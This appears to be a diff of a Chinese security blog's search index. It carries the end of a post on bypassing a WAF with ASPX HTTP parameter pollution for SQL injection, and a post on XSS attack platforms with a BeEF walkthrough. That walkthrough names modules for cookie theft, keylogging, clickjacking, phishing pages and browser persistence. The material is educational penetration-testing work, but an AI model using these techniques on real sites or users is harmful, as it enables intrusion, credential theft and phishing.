/&gt;</span><br><span class="line">            &lt;ItemStyle BackColor=&quot;White&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">&lt;HeaderStyle CssClass=&quot;head&quot; BackColor=&quot;#003399&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCCCFF&quot;&gt;&lt;/HeaderStyle&gt;</span><br><span class="line">        &lt;/asp:DataGrid&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="HPP分割参数绕过"><a href="#HPP分割参数绕过" class="headerlink" title="HPP分割参数绕过"></a>HPP分割参数绕过</h3><h4 id="绕过原理-4"><a href="#绕过原理-4" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：HTTP参数污染</strong></p>
-<p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p>
-<p>在ASPX中，有一个比较特殊的HPP特性，当GET/POST/COOKIE同时提交的参数id，服务端接收参数id的顺序GET,POST,COOKIE，中间通过逗号链接，于是就有了这个idea。</p>
-<p>UNION、SELECT、FROM 三个关键字分别放在GET/POST/COOKIE的位置，通过ASPX的这个特性连起来，堪称完美的一个姿势，压根不好防。</p>
-<p>但姿势利用太过于局限： 使用Request.Params[“id”]来获取参数,G-P-C获取到参数拼接起来，仅仅作为Bypass分享一种思路而已。</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nxzhYKqy6N2ked4h26t90woffPY1UxcJt6cQhMdzlicibZJNte04WjFeJf5cEkibVfGGK3fgXr9h5UA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>
-<p><strong>绕过技巧</strong>：</p>
-<ul>
-<li>GET型请求转POST型</li>
-<li>参数传递的顺序：GET-&gt;POST-&gt;COOKIE</li>
-<li>使用多行注释符/**/来闭合分割参数的逗号</li>
-</ul>
-<p><img src="https://i.loli.net/2021/10/27/SxH8TCOv2LsNBgQ.png" alt="image-20211027201228560"></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li>ZP《Bypass安全狗mysql注入》</li>
-<li><a href="https://cloud.tencent.com/developer/article/1856698?from=article.detail.1631936">SQL注入 安全狗apache4.0.26655绕过 - 云+社区 - 腾讯云 (tencent.com)</a></li>
-<li><a href="https://cloud.tencent.com/developer/article/1631936?from=article.detail.1856683">Fuzz绕过安全狗4.0实现SQL注入 - 云+社区 - 腾讯云 (tencent.com)</a></li>
-<li><a href="https://cloud.tencent.com/developer/article/1856683">SQL注入-安全狗超大数据包绕过 - 云+社区 - 腾讯云 (tencent.com)</a></li>
-<li><a href="https://blog.csdn.net/weixin_50464560/article/details/120182543">Bypass WAF之HTTP参数污染(HPP)漏洞挖掘_J0hnson666的博客-CSDN博客</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>WAF-Bypass</tag>
       </tags>
   </entry>
   <entry>
@@ -6812,6 +6812,114 @@
       </tags>
   </entry>
   <entry>
+    <title>XSS攻击平台</title>
+    <url>/post/467ebde5.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
+<p>XSS Payload如此强大，为了使用方便，有安全研究者将许多功能封装起来，成为XSS攻击平台。这些攻击平台主要目的是为了演示XSS的危害，以及方便渗透测试使用。下面介绍了几个常见的XSS攻击平台。</p>
+</blockquote>
+<h2 id="开源的XSS平台项目"><a href="#开源的XSS平台项目" class="headerlink" title="开源的XSS平台项目"></a>开源的XSS平台项目</h2><h3 id="XSS-Platform"><a href="#XSS-Platform" class="headerlink" title="XSS Platform"></a>XSS Platform</h3><p>XSS Platform 是一个非常经典的XSS渗透测试管理系统，原作者在2011年所开发，由于后来长时间没有人维护，导致目前在PHP7环境下无法运行。该项目作者将源码移植到了PHP7环境中，同时增加安装功能。</p>
+<p>项目地址：<a href="https://github.com/78778443/xssplatform">https://github.com/78778443/xssplatform</a></p>
+<h3 id="BlueLotus-XSSReceiver"><a href="#BlueLotus-XSSReceiver" class="headerlink" title="BlueLotus_XSSReceiver"></a>BlueLotus_XSSReceiver</h3><p>其安装起来相比较于xss-platform更加简单，如果说xss-platform是一个多人使用的堡垒，而BlueLotus_XSS更像是一个人使用的瑞士军刀。其界面布局清新、数据可阅读性好、IP获取准确、IP地址定位精准、轻量级（无需数据库）、对数据存储进行加密。</p>
+<p>项目地址：<a href="https://github.com/asw3asw/BlueLotus_XSSReceiver">https://github.com/asw3asw/BlueLotus_XSSReceiver</a></p>
+<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><p>Medusa是一个红队武器库平台，目前包括XSS平台、协同平台、CVE监控、免杀生成、DNSLOG、钓鱼邮件等功能。</p>
+<p>项目地址：<a href="https://github.com/Ascotbe/Medusa">https://github.com/Ascotbe/Medusa</a></p>
+<p>官方文档：<a href="http://medusa.ascotbe.com/Documentation/#/">http://medusa.ascotbe.com/Documentation/#/</a></p>
+<h2 id="在线的XSS平台"><a href="#在线的XSS平台" class="headerlink" title="在线的XSS平台"></a>在线的XSS平台</h2><ul>
+<li>NGXPT：<a href="https://ngxpt.co/">https://ngxpt.co/</a></li>
+<li>XSSYE：<a href="https://xssye.com/">https://xssye.com/</a></li>
+<li>XSSSAQ：<a href="https://xssaq.com/">https://xssaq.com/</a></li>
+<li>XSS.SB：<a href="https://xss.sb/">https://xss.sb/</a></li>
+<li>XSS.PT：<a href="https://xss.pt/">https://xss.pt/</a></li>
+</ul>
+<p>并不推荐使用在线的XSS平台，毕竟敏感信息要传输到陌生人的服务器上，而且服务器端测试代码存在不可控性</p>
+<h2 id="BeEF-XSS"><a href="#BeEF-XSS" class="headerlink" title="BeEF-XSS"></a>BeEF-XSS</h2><h3 id="BeEF-XSS的介绍"><a href="#BeEF-XSS的介绍" class="headerlink" title="BeEF-XSS的介绍"></a>BeEF-XSS的介绍</h3><p>BeEF-XSS，全称The Browser Exploitation Framework(浏览器攻击框架)，是一款非常强大的web框架攻击平台，集成了许多payload，可以实现许多功能！</p>
+<p>BeEF的架构图如下：</p>
+<p><img src="https://i.loli.net/2021/11/16/9ZTFWC3Or5aENdh.png" alt="img"></p>
+<p>zombie即受害者浏览器。zombie 是被 hook的，如果浏览器访问有钩子（由 js 编写）的页面，就会被 hook，勾连的服务器会执行初始代码返回一些信息，接着 zombie 会每隔一段时间（默认为 1 秒）就会向BeEF 服务器发送一个请求，询问是否有新的代码需要执行。BeEF 服务器本质上就像一个 Web 应用，分为前端 UI 和，后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，BeEF 持有者可以通过浏览器来登录 BeEF 的后端管理 UI 或者切换到他的工作目录中使用脚本启动。</p>
+<h3 id="BeEF-XSS使用的基本流程"><a href="#BeEF-XSS使用的基本流程" class="headerlink" title="BeEF-XSS使用的基本流程"></a>BeEF-XSS使用的基本流程</h3><p>第一次启动需要设置登录密码。</p>
+<p><img src="https://i.loli.net/2021/11/16/tE8r9zloYZGwFi6.png" alt="image-20211116144858252"></p>
+<p>登录页面，用户名为beef</p>
+<p><img src="https://i.loli.net/2021/11/16/XZD4CNrHFeu82KL.png" alt="image-20211116145812328"></p>
+<p>在漏洞页面中插入BeEF的hook脚本</p>
+<p><img src="https://i.loli.net/2021/11/16/WSpwKDRn2MhZlYF.png" alt="image-20211116154259761"></p>
+<p>在BeEF-XSS主页面中可以看到受害者的浏览器正式上线，接着就可以使用Command模块对其进行利用</p>
+<p><img src="https://i.loli.net/2021/11/16/ZNwA9WE4bvoyfiQ.png" alt="image-20211116151644248"></p>
+<p>BeEF-XSS主页面基本介绍：</p>
+<ul>
+<li><strong>Hocked Browers</strong><ul>
+<li>online browers 在线浏览器</li>
+<li>offline browers  离线浏览器</li>
+</ul>
+</li>
+<li><strong>Detials</strong><ul>
+<li>浏览器、插件版本信息，操作系统信息</li>
+</ul>
+</li>
+<li><strong>Logs</strong><ul>
+<li>浏览器动作：焦点变化，鼠标单击，信息输入</li>
+</ul>
+</li>
+<li><strong>Commands</strong><ul>
+<li>绿色模块：命令模块针对目标浏览器工作，并且受害者不可见</li>
+<li>橙色模块：命令模块针对目标浏览器工作，但受害者可见</li>
+<li>灰色模块：命令模块尚未针对该目标浏览器进行验证</li>
+<li>红色模块：命令模块不适用目标浏览器，有些红色模块也可以执行</li>
+</ul>
+</li>
+<li><strong>Network</strong><ul>
+<li>能够自动生成网络拓扑图</li>
+</ul>
+</li>
+</ul>
+<h3 id="BeEF-XSS模块的利用"><a href="#BeEF-XSS模块的利用" class="headerlink" title="BeEF-XSS模块的利用"></a>BeEF-XSS模块的利用</h3><h4 id="弹窗提示"><a href="#弹窗提示" class="headerlink" title="弹窗提示"></a>弹窗提示</h4><p>可以使用alert或prompt进行弹窗。</p>
+<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Create Alert Dialog</code></p>
+<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Create Prompt Dialog</code></p>
+<h4 id="获取Cookie值"><a href="#获取Cookie值" class="headerlink" title="获取Cookie值"></a>获取Cookie值</h4><p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Get Cookie</code></p>
+<p><img src="https://i.loli.net/2021/11/16/Sy65orHOvLZfcYD.png" alt="image-20211116155936182"></p>
+<p><img src="https://i.loli.net/2021/11/16/noVqJPFjh7Dr64s.png" alt="image-20211116160001489"></p>
+<h4 id="网页重定向"><a href="#网页重定向" class="headerlink" title="网页重定向"></a>网页重定向</h4><p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Redirect Browser</code></p>
+<p><img src="https://i.loli.net/2021/11/16/uBPUNIhR2nzLCAk.png" alt="image-20211116161448680"></p>
+<p>受害者的网页便会重定向到我们给定的URL。</p>
+<p>但是这样一来受害者的浏览器便会脱离BeEF的控制，那么我们可以使用iFrame框架的方式进行重定向。</p>
+<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Redirect Browser(iFrame)</code></p>
+<p><img src="https://i.loli.net/2021/11/16/QXC8Exc6aIyfVze.png" alt="image-20211116161943261"></p>
+<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>使用模块：<code>Misc -&gt; iFrame Event Key Logger</code></p>
+<p><img src="https://i.loli.net/2021/11/16/clirRFhVmI7xBgL.png" alt="image-20211116175226073"></p>
+<p><img src="https://i.loli.net/2021/11/16/QYCIlZivHeAhzwa.png" alt="image-20211116175342133"></p>
+<h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><p>使用模块：<code>Social Engineering -&gt; Clickjacking</code></p>
+<p><img src="https://i.loli.net/2021/11/16/2hck7S1QxZmdaz6.png" alt="image-20211116164726334"></p>
+<p>每当鼠标点击在页面上点击时，就会自动执行js代码。</p>
+<h4 id="社工弹窗钓鱼"><a href="#社工弹窗钓鱼" class="headerlink" title="社工弹窗钓鱼"></a>社工弹窗钓鱼</h4><h5 id="Flash更新页面钓鱼"><a href="#Flash更新页面钓鱼" class="headerlink" title="Flash更新页面钓鱼"></a>Flash更新页面钓鱼</h5><p>使用模块：<code>Social Engineering -&gt; Fake Flash Update</code></p>
+<p><img src="https://i.loli.net/2021/11/16/XfD1GcRbNiC79qz.png" alt="image-20211116165540546"></p>
+<h5 id="通知栏钓鱼"><a href="#通知栏钓鱼" class="headerlink" title="通知栏钓鱼"></a>通知栏钓鱼</h5><p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（Chrome）</code></p>
+<p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（Firefox）</code></p>
+<p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（IE）</code></p>
+<h5 id="登录页面钓鱼"><a href="#登录页面钓鱼" class="headerlink" title="登录页面钓鱼"></a>登录页面钓鱼</h5><p><strong>Google Mail登录</strong></p>
+<p>使用模块：<code>Social Engineering -&gt; Google Phishing</code></p>
+<p><strong>弹窗登录</strong></p>
+<p>弹窗页面有：Facebook、LinkedIn、Windows、YouTube、Yammer、IOS、Generic</p>
+<p>使用模块：<code>Social Engineering -&gt; Pretty Theft</code></p>
+<h4 id="持久化控制"><a href="#持久化控制" class="headerlink" title="持久化控制"></a>持久化控制</h4><h5 id="浏览器中间人攻击"><a href="#浏览器中间人攻击" class="headerlink" title="浏览器中间人攻击"></a>浏览器中间人攻击</h5><p>常规页面与MitB（浏览器中间人攻击）中毒页面的区别在于，MitB会异步加载资源，同时保持勾连活动。对于用户来说一切都好像在正常页面中操作一样，很难察觉到有异常。这里要注意一下，如果用户单击了跨域链接，MitB会在浏览器中打开一个新的标签页，并把响应的内容放在新的标签页。</p>
+<p>使用模块：<code>Persistencr -&gt; Man-In-The-Browser</code></p>
+<h5 id="IFrame内嵌框架"><a href="#IFrame内嵌框架" class="headerlink" title="IFrame内嵌框架"></a>IFrame内嵌框架</h5><p>IFrame是HTML中的一个标签，可以创建包含另外一个文档的内联框架。为了持久的控制，可以创建一个全屏（整个浏览器）的IFrame来把页面放进去。BeEF的作者建议如果想持久化，内嵌框架是首选方案，原因如下：第一，可以完全控制内嵌框架的DOM内容。第二，内嵌框架主要用于在当前页面嵌入其他文档的事实，为持久化提供了直接了当的方法。</p>
+<p>使用模块：<code>Persistencr -&gt; CreateForeground iFrame</code></p>
+<p>另外，BeEF还可以结合MSF进行渗透测试，这会在之后使用MSF的时候进行讲解。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>吴翰清 著《白帽子讲Web安全》</li>
+<li><a href="https://blog.csdn.net/smli_ng/article/details/106067842">BeEF-XSS详细使用教程_星落的博客-CSDN博客_beef-xss</a></li>
+<li><a href="https://www.cnblogs.com/csnd/p/11808028.html">BeEF的使用 - 墨鱼菜鸡 - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://www.cnblogs.com/p0pl4r/p/11160387.html">xss利用——BeEF#stage2（初始并持续化控制） - p0pl4r - 博客园 (cnblogs.com)</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>XSS跨站脚本</category>
+      </categories>
+      <tags>
+        <tag>XSS跨站脚本</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS利用方式剖析</title>
     <url>/post/a27c520e.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
@@ -7001,114 +7109,6 @@
 <li><a href="https://segmentfault.com/a/1190000022235530">你真的知道 Cookie 吗？ SameSite 、 Secure 、 HttpOnly - SegmentFault 思否</a></li>
 <li><a href="https://blog.csdn.net/h_MXC/article/details/50542038">Session攻击手段(会话劫持/固定)及其安全防御措施_马学朝的博客-CSDN博客</a></li>
 <li><a href="https://blog.csdn.net/eT48_sec/article/details/42193903"> XSS信息刺探脚本_eT48_Sec-CSDN博客</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>XSS跨站脚本</category>
-      </categories>
-      <tags>
-        <tag>XSS跨站脚本</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS攻击平台</title>
-    <url>/post/467ebde5.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
-<p>XSS Payload如此强大，为了使用方便，有安全研究者将许多功能封装起来，成为XSS攻击平台。这些攻击平台主要目的是为了演示XSS的危害，以及方便渗透测试使用。下面介绍了几个常见的XSS攻击平台。</p>
-</blockquote>
-<h2 id="开源的XSS平台项目"><a href="#开源的XSS平台项目" class="headerlink" title="开源的XSS平台项目"></a>开源的XSS平台项目</h2><h3 id="XSS-Platform"><a href="#XSS-Platform" class="headerlink" title="XSS Platform"></a>XSS Platform</h3><p>XSS Platform 是一个非常经典的XSS渗透测试管理系统，原作者在2011年所开发，由于后来长时间没有人维护，导致目前在PHP7环境下无法运行。该项目作者将源码移植到了PHP7环境中，同时增加安装功能。</p>
-<p>项目地址：<a href="https://github.com/78778443/xssplatform">https://github.com/78778443/xssplatform</a></p>
-<h3 id="BlueLotus-XSSReceiver"><a href="#BlueLotus-XSSReceiver" class="headerlink" title="BlueLotus_XSSReceiver"></a>BlueLotus_XSSReceiver</h3><p>其安装起来相比较于xss-platform更加简单，如果说xss-platform是一个多人使用的堡垒，而BlueLotus_XSS更像是一个人使用的瑞士军刀。其界面布局清新、数据可阅读性好、IP获取准确、IP地址定位精准、轻量级（无需数据库）、对数据存储进行加密。</p>
-<p>项目地址：<a href="https://github.com/asw3asw/BlueLotus_XSSReceiver">https://github.com/asw3asw/BlueLotus_XSSReceiver</a></p>
-<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><p>Medusa是一个红队武器库平台，目前包括XSS平台、协同平台、CVE监控、免杀生成、DNSLOG、钓鱼邮件等功能。</p>
-<p>项目地址：<a href="https://github.com/Ascotbe/Medusa">https://github.com/Ascotbe/Medusa</a></p>
-<p>官方文档：<a href="http://medusa.ascotbe.com/Documentation/#/">http://medusa.ascotbe.com/Documentation/#/</a></p>
-<h2 id="在线的XSS平台"><a href="#在线的XSS平台" class="headerlink" title="在线的XSS平台"></a>在线的XSS平台</h2><ul>
-<li>NGXPT：<a href="https://ngxpt.co/">https://ngxpt.co/</a></li>
-<li>XSSYE：<a href="https://xssye.com/">https://xssye.com/</a></li>
-<li>XSSSAQ：<a href="https://xssaq.com/">https://xssaq.com/</a></li>
-<li>XSS.SB：<a href="https://xss.sb/">https://xss.sb/</a></li>
-<li>XSS.PT：<a href="https://xss.pt/">https://xss.pt/</a></li>
-</ul>
-<p>并不推荐使用在线的XSS平台，毕竟敏感信息要传输到陌生人的服务器上，而且服务器端测试代码存在不可控性</p>
-<h2 id="BeEF-XSS"><a href="#BeEF-XSS" class="headerlink" title="BeEF-XSS"></a>BeEF-XSS</h2><h3 id="BeEF-XSS的介绍"><a href="#BeEF-XSS的介绍" class="headerlink" title="BeEF-XSS的介绍"></a>BeEF-XSS的介绍</h3><p>BeEF-XSS，全称The Browser Exploitation Framework(浏览器攻击框架)，是一款非常强大的web框架攻击平台，集成了许多payload，可以实现许多功能！</p>
-<p>BeEF的架构图如下：</p>
-<p><img src="https://i.loli.net/2021/11/16/9ZTFWC3Or5aENdh.png" alt="img"></p>
-<p>zombie即受害者浏览器。zombie 是被 hook的，如果浏览器访问有钩子（由 js 编写）的页面，就会被 hook，勾连的服务器会执行初始代码返回一些信息，接着 zombie 会每隔一段时间（默认为 1 秒）就会向BeEF 服务器发送一个请求，询问是否有新的代码需要执行。BeEF 服务器本质上就像一个 Web 应用，分为前端 UI 和，后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，BeEF 持有者可以通过浏览器来登录 BeEF 的后端管理 UI 或者切换到他的工作目录中使用脚本启动。</p>
-<h3 id="BeEF-XSS使用的基本流程"><a href="#BeEF-XSS使用的基本流程" class="headerlink" title="BeEF-XSS使用的基本流程"></a>BeEF-XSS使用的基本流程</h3><p>第一次启动需要设置登录密码。</p>
-<p><img src="https://i.loli.net/2021/11/16/tE8r9zloYZGwFi6.png" alt="image-20211116144858252"></p>
-<p>登录页面，用户名为beef</p>
-<p><img src="https://i.loli.net/2021/11/16/XZD4CNrHFeu82KL.png" alt="image-20211116145812328"></p>
-<p>在漏洞页面中插入BeEF的hook脚本</p>
-<p><img src="https://i.loli.net/2021/11/16/WSpwKDRn2MhZlYF.png" alt="image-20211116154259761"></p>
-<p>在BeEF-XSS主页面中可以看到受害者的浏览器正式上线，接着就可以使用Command模块对其进行利用</p>
-<p><img src="https://i.loli.net/2021/11/16/ZNwA9WE4bvoyfiQ.png" alt="image-20211116151644248"></p>
-<p>BeEF-XSS主页面基本介绍：</p>
-<ul>
-<li><strong>Hocked Browers</strong><ul>
-<li>online browers 在线浏览器</li>
-<li>offline browers  离线浏览器</li>
-</ul>
-</li>
-<li><strong>Detials</strong><ul>
-<li>浏览器、插件版本信息，操作系统信息</li>
-</ul>
-</li>
-<li><strong>Logs</strong><ul>
-<li>浏览器动作：焦点变化，鼠标单击，信息输入</li>
-</ul>
-</li>
-<li><strong>Commands</strong><ul>
-<li>绿色模块：命令模块针对目标浏览器工作，并且受害者不可见</li>
-<li>橙色模块：命令模块针对目标浏览器工作，但受害者可见</li>
-<li>灰色模块：命令模块尚未针对该目标浏览器进行验证</li>
-<li>红色模块：命令模块不适用目标浏览器，有些红色模块也可以执行</li>
-</ul>
-</li>
-<li><strong>Network</strong><ul>
-<li>能够自动生成网络拓扑图</li>
-</ul>
-</li>
-</ul>
-<h3 id="BeEF-XSS模块的利用"><a href="#BeEF-XSS模块的利用" class="headerlink" title="BeEF-XSS模块的利用"></a>BeEF-XSS模块的利用</h3><h4 id="弹窗提示"><a href="#弹窗提示" class="headerlink" title="弹窗提示"></a>弹窗提示</h4><p>可以使用alert或prompt进行弹窗。</p>
-<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Create Alert Dialog</code></p>
-<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Create Prompt Dialog</code></p>
-<h4 id="获取Cookie值"><a href="#获取Cookie值" class="headerlink" title="获取Cookie值"></a>获取Cookie值</h4><p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Get Cookie</code></p>
-<p><img src="https://i.loli.net/2021/11/16/Sy65orHOvLZfcYD.png" alt="image-20211116155936182"></p>
-<p><img src="https://i.loli.net/2021/11/16/noVqJPFjh7Dr64s.png" alt="image-20211116160001489"></p>
-<h4 id="网页重定向"><a href="#网页重定向" class="headerlink" title="网页重定向"></a>网页重定向</h4><p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Redirect Browser</code></p>
-<p><img src="https://i.loli.net/2021/11/16/uBPUNIhR2nzLCAk.png" alt="image-20211116161448680"></p>
-<p>受害者的网页便会重定向到我们给定的URL。</p>
-<p>但是这样一来受害者的浏览器便会脱离BeEF的控制，那么我们可以使用iFrame框架的方式进行重定向。</p>
-<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Redirect Browser(iFrame)</code></p>
-<p><img src="https://i.loli.net/2021/11/16/QXC8Exc6aIyfVze.png" alt="image-20211116161943261"></p>
-<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>使用模块：<code>Misc -&gt; iFrame Event Key Logger</code></p>
-<p><img src="https://i.loli.net/2021/11/16/clirRFhVmI7xBgL.png" alt="image-20211116175226073"></p>
-<p><img src="https://i.loli.net/2021/11/16/QYCIlZivHeAhzwa.png" alt="image-20211116175342133"></p>
-<h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><p>使用模块：<code>Social Engineering -&gt; Clickjacking</code></p>
-<p><img src="https://i.loli.net/2021/11/16/2hck7S1QxZmdaz6.png" alt="image-20211116164726334"></p>
-<p>每当鼠标点击在页面上点击时，就会自动执行js代码。</p>
-<h4 id="社工弹窗钓鱼"><a href="#社工弹窗钓鱼" class="headerlink" title="社工弹窗钓鱼"></a>社工弹窗钓鱼</h4><h5 id="Flash更新页面钓鱼"><a href="#Flash更新页面钓鱼" class="headerlink" title="Flash更新页面钓鱼"></a>Flash更新页面钓鱼</h5><p>使用模块：<code>Social Engineering -&gt; Fake Flash Update</code></p>
-<p><img src="https://i.loli.net/2021/11/16/XfD1GcRbNiC79qz.png" alt="image-20211116165540546"></p>
-<h5 id="通知栏钓鱼"><a href="#通知栏钓鱼" class="headerlink" title="通知栏钓鱼"></a>通知栏钓鱼</h5><p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（Chrome）</code></p>
-<p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（Firefox）</code></p>
-<p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（IE）</code></p>
-<h5 id="登录页面钓鱼"><a href="#登录页面钓鱼" class="headerlink" title="登录页面钓鱼"></a>登录页面钓鱼</h5><p><strong>Google Mail登录</strong></p>
-<p>使用模块：<code>Social Engineering -&gt; Google Phishing</code></p>
-<p><strong>弹窗登录</strong></p>
-<p>弹窗页面有：Facebook、LinkedIn、Windows、YouTube、Yammer、IOS、Generic</p>
-<p>使用模块：<code>Social Engineering -&gt; Pretty Theft</code></p>
-<h4 id="持久化控制"><a href="#持久化控制" class="headerlink" title="持久化控制"></a>持久化控制</h4><h5 id="浏览器中间人攻击"><a href="#浏览器中间人攻击" class="headerlink" title="浏览器中间人攻击"></a>浏览器中间人攻击</h5><p>常规页面与MitB（浏览器中间人攻击）中毒页面的区别在于，MitB会异步加载资源，同时保持勾连活动。对于用户来说一切都好像在正常页面中操作一样，很难察觉到有异常。这里要注意一下，如果用户单击了跨域链接，MitB会在浏览器中打开一个新的标签页，并把响应的内容放在新的标签页。</p>
-<p>使用模块：<code>Persistencr -&gt; Man-In-The-Browser</code></p>
-<h5 id="IFrame内嵌框架"><a href="#IFrame内嵌框架" class="headerlink" title="IFrame内嵌框架"></a>IFrame内嵌框架</h5><p>IFrame是HTML中的一个标签，可以创建包含另外一个文档的内联框架。为了持久的控制，可以创建一个全屏（整个浏览器）的IFrame来把页面放进去。BeEF的作者建议如果想持久化，内嵌框架是首选方案，原因如下：第一，可以完全控制内嵌框架的DOM内容。第二，内嵌框架主要用于在当前页面嵌入其他文档的事实，为持久化提供了直接了当的方法。</p>
-<p>使用模块：<code>Persistencr -&gt; CreateForeground iFrame</code></p>
-<p>另外，BeEF还可以结合MSF进行渗透测试，这会在之后使用MSF的时候进行讲解。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li>吴翰清 著《白帽子讲Web安全》</li>
-<li><a href="https://blog.csdn.net/smli_ng/article/details/106067842">BeEF-XSS详细使用教程_星落的博客-CSDN博客_beef-xss</a></li>
-<li><a href="https://www.cnblogs.com/csnd/p/11808028.html">BeEF的使用 - 墨鱼菜鸡 - 博客园 (cnblogs.com)</a></li>
-<li><a href="https://www.cnblogs.com/p0pl4r/p/11160387.html">xss利用——BeEF#stage2（初始并持续化控制） - p0pl4r - 博客园 (cnblogs.com)</a></li>
 </ul>
 ]]></content>
       <categories>
